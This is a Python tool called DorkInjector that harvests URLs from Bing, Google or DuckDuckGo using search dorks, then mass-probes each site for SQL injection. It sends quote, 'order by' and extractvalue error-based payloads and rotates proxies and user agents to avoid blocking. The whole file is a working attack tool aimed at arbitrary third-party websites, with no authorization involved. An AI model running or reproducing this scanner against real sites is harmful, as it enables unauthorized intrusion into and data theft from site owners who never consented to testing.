import bs4, requests
from fake_useragent import UserAgent
from datetime import datetime as dt
from itertools import cycle
from multiprocessing import Pool, cpu_count
import argparse
import sys, os, textwrap
from termcolor import cprint


def check_args():
    parse = argparse.ArgumentParser(
        prog='DorkInjector.py',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''\
         \tBy default DorkInjector.py will try to find all urls from Bing using your dork,
         \tthen it will try to inject them.
         \tP.S You can specify --engine option to pick either Google or DuckDuckGo.
         \tIf you picked Google you should have really good private proxies.
         '''))

    parse.add_argument('-d', '--dork', help='enter your dork: -d \'inurl:"something.php?id=" ...\'')
    parse.add_argument('-p', '--proxies', nargs='?', const=None, default=None,
                       help='enter your file with proxies in format: -p proxies.txt')
    parse.add_argument('-e', '--engine', default='bing', const='bing', nargs='?', choices=['google', 'duck', 'bing'],
                       help='pick one of the engines(google, duck, bing): -e duck or --engine google. Default: Bing')
    parse.add_argument('-s', '--sites', help='enter file with list of websites to check: -s websites.txt')
    parse.add_argument('-t', '--timeout', nargs='?', const=5, type=int, default=5,
                       help='enter timeout length: -t 10; Default 5 seconds')
    parse.add_argument('-m', '--max', nargs='?', const=1, type=int, default=1,
                       help="enter how many search pages you need: -m 5; Default is first page")
    parse.add_argument('-o', '--output', nargs='?', const='results.txt', default='results.txt',
                       help='enter output filename: -o results.txt')

    args_list = parse.parse_args()

    return args_list


def bing_main(links):
    session = refresh_session()

    for page in range(0, max_pages):
        query = f"/search?q={dork}&qs=n&sp=-1&sc=0-27&sk=&first={page}1&FORM=PERE"
        cprint(f"[*] Collecting links from page: {page}", 'yellow')

        try:
            links.extend(bing_search(query, session))
            cprint("\tLinks collected", 'green')
        except TypeError:
            cprint("[-] Nothing was added. Try to rerun program", 'red')

    save_search(links)


def bing_search(query, session):
    url = "https://www.bing.com" + query
    print(url)

    try:
        response = session.get(url)
        status = response.status_code

        if status == 200:
            soup = get_soup(response)
            elements = soup.find_all("li", class_="b_algo")
            return [element.find("a").get("href") for element in elements]

        else:
            cprint(f"[-] Something went wrong. Status code: {status}", 'red')
    except Exception as e:
        cprint(f"[-] Error: {e}", 'red', attrs=['bold'])


def duck_main(links):
    # dork is taken from outer scope
    param = {
        'q': dork,
        's': '0',
    }

    session = refresh_session()
    # max_pages is taken from outer scope
    for page in range(max_pages):
        cprint(f"[*] Collecting links from page: {page}", 'yellow')
        try:
            flag, results = duck_search(session, param)
            if results is not None:
                links.extend(results)
                cprint("\tLinks collected", 'green')

            if not flag:
                break
        except:
            pass

    save_search(links)


def duck_search(session, param):

    duck = "https://duckduckgo.com/html/"
    response = session.post(url=duck, data=param)
    code = response.status_code
    if code == 200:
        cprint(f"\tResponse code: {code}", 'green')

        soup = get_soup(response)
        no_results = soup.find("div", class_="no-results")
        if no_results is not None:
            cprint("[-] No results found", 'red', attrs=['bold'])
            return False, None

        else:
            all_a = soup.find_all('a', class_="result__a")
            links = [a.get('href') for a in all_a if "?" in a.get('href') and "=" in a.get('href')]

            form = soup.find('div', class_='nav-link')
            if form is not None:
                next_params = form.find_all("input")
                updated = {elem.get("name"): elem.get("value") for elem in next_params[1:]}
                param.update(updated)
                flag = True
            else:
                cprint("[!] No more pages left.", 'yellow')
                flag = False

            return flag, links
    else:
        cprint(f"\tResponse code: {code}", 'red', attrs=['bold'])


def get_soup(response):
    return bs4.BeautifulSoup(response.text, "lxml")


def google_main(links):
    session = refresh_session()

    # max_pages is taken from outer scope
    for page in range(0, max_pages * 10, 10):
        if page % 50 == 0:
            session = refresh_session()

        # dork is taken from outer scope
        query = f"search?q={dork}&start={page}"

        try:
            cprint(f"[*] Collecting links from page: {page // 10}", 'yellow')
            links.extend(google_search(query, session))
            cprint("\tLinks collected", 'green')
        except TypeError:
            cprint("\tNothing was added, IP is blocked. Switching to next proxy if specified", 'red', attrs=['bold'])
            session = refresh_session()

    save_search(links)


def google_search(query, session):
    url = "https://www.google.com/" + query
    try:
        response = session.get(url)

        if response.status_code == 200:
            soup = get_soup(response)
            div_links = soup.find_all("div", class_="r")

            return [div.find("a").get("href") for div in div_links]

        else:
            cprint("[-] Blocked IP", 'red', attrs=['bold'])
    except:
        cprint("[-] Error", 'red', attrs=['bold'])


def read_file(filename):
    with open(filename) as file:
        return [line.strip() for line in file.readlines()]


def refresh_session():
    global proxies_cycled
    session = requests.Session()

    if proxies_cycled is not None:
        proxy = next(proxies_cycled)
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update(make_headers())
    return session


def make_headers():
    global ua
    return {"User-Agent": ua.random}


def inject(link):
    payloads = ["'",
                "\"",
                "')",
                "\")"
                " order by 100000",
                "' order by 100000--+",
                "\" order by 100000--+",
                "1111111' and extractvalue(0x0a,concat(0x0a,(select database())))--+",
                "1111111\" and extractvalue(0x0a,concat(0x0a,(select database())))--+",
                " and extractvalue(0x0a,concat(0x0a,(select database())))--+"]

    session = refresh_session()
    for payload in payloads:
        injection = link + payload
        cprint(f"[*] Sending payload: {injection}", attrs=['dark'])
        try:
            # timeout - outer scope
            response = session.get(injection, timeout=timeout)

            if error_check(response.text):
                cprint(f"[+] {link} might be vulnerable", 'green', attrs=['bold'])
                save(link, output)
                break
        except requests.exceptions.Timeout:
            cprint(f"[-] Timeout error: {link}", 'red')
            break
        except requests.exceptions.ConnectionError:
            cprint(f"[-] Connection error: {link}", 'red')
            break
        except requests.exceptions.TooManyRedirects:
            cprint(f"[-] Too Many Redirects error: {link}", 'red')
            break
        except Exception as e:
            cprint(f"[-] Unhandled error: {e}", 'red', attrs=['bold'])
            break


def error_check(html_text):
    # errors is taken from outer scope
    result = any([error in html_text for error in errors])
    if result:
        return True


def make_filename(filename):
    if not os.path.exists(filename):
        return filename

    fname, fextension = os.path.splitext(filename)
    i = 0
    new_filename = f"{fname}{i}{fextension}"
    while os.path.exists(new_filename):
        i += 1
        new_filename = f"{fname}{i}{fextension}"

    return new_filename


def save_search(links):
    if len(links) > 0:

        filename = make_filename("searchResult.txt")
        for link in links:
                save(link, filename)
        cprint(f"[+] Total {len(links)} links were saved for scan", 'green')
    else:
        sys.exit("[0] Nothing was found. Exiting...")


def save(link, filename):
    with open(filename, 'a') as f:
        f.write(link + '\n')

    cprint(f"[+] {link} saved to {filename}", 'green')


def main():

    links = []
    start = dt.now()

    if sites is not None:
        try:
            cprint(f"[!] Inject mode is ON. Getting urls from {sites}", 'green', attrs=['bold'])
            links.extend(read_file(sites))
        except FileNotFoundError:
            sys.exit("[-] File does not exist")
    else:
        cprint("[!] Dorking mode is ON. Start parsing search results", 'green', attrs=['bold'])
        # MAIN CHOICE FOR DORKING
        # is_google - outer scope
        if engine == "google":
            print("[!] Google search engine is used. Search engine: Google")
            google_main(links=links)
        elif engine == "duck":
            print("[!] Bing search engine is used. Search engine: DuckDuckGo")
            duck_main(links=links)
        else:
            print("[!] Default search engine: Bing")
            bing_main(links=links)

    # INJECTION RUNNER
    cprint(f"[!] total pages to inject: {len(links)}", 'yellow', attrs=['bold'])
    # leave one cpu for system services
    with Pool(cpu_count()-1) as pool:
        pool.map(inject, links)

    finish = dt.now() - start
    cprint("\n[+]Finished in " + str(finish), 'green')


def logo():
    msg = '''
    --------------------------------------------------------------------------
     _______   ______  ________  __    ___                                   |
    |  ___  \ /      \|  __    \|   | /  /                                   |
    | |   \  |  ----  |     \   |   |/  /                                    |
    | |    | |      | |     /  /|      /                                     |
    | |    | |      | |       / |  |\  \                                     | 
    | |___/  |  ----  |  | \  \ |  | \  \                                    |
    |_______/ \______/|_ |__\__\ __|__\__\   _________   ____   ______       |
                |   |   |  |      | / ___  \|         |/      \| __    \     |
                |   |   |  |   ___|/ |   \__\---   ---|  ___   |    \   |    |
                |   |   |  |  |___   |         |   |  |     |  |    /  /     |
                |   |  _|  |   ___|  |    __   |   |  |     |  |      \      |
                |   |/     |  |___ \  \__/  /  |   |  |  ---   |  |\   \     |
                |___|\_____|______| \______/   |___|   \_____ / __| \___\    |
                                                                             |
                                                       by VoltK              |
    --------------------------------------------------------------------------
    
    '''
    print(msg)


if __name__ == '__main__':
    arguments = check_args()
    logo()

    if not len(sys.argv) > 1:
        sys.exit("[!] No arguments specified. Use --help option to read description")

    # get arguments
    dork = arguments.dork
    sites = arguments.sites

    if dork is not None and sites is not None:
        sys.exit("[-] Error. You can use either dork search or run over file with websites.")
    elif dork is None and sites is None:
        sys.exit("[-] Error. You need to pick either dork search or run over file with websites.")

    engine = arguments.engine
    max_pages = arguments.max
    timeout = arguments.timeout

    # make unique output name
    output = make_filename(arguments.output)

    # default things
    ua = UserAgent()
    errors = read_file("errors.txt")

    proxies_file = arguments.proxies
    # check if proxies needed
    proxies_cycled = None
    if proxies_file is not None:
        try:
            proxies_cycled = cycle(read_file(proxies_file))
        except FileNotFoundError:
            print("[-] Failed to get a file with proxies. ")

            answer = input("[?] Continue without them(Y/N): ")
            if answer == "N" or answer == "n":
                sys.exit("[!] Exiting...")
            elif answer == "Y" or answer == "y":
                print("[!] Continue without proxies")
            else:
                sys.exit("[!] Wrong option. Exiting...")

    main()
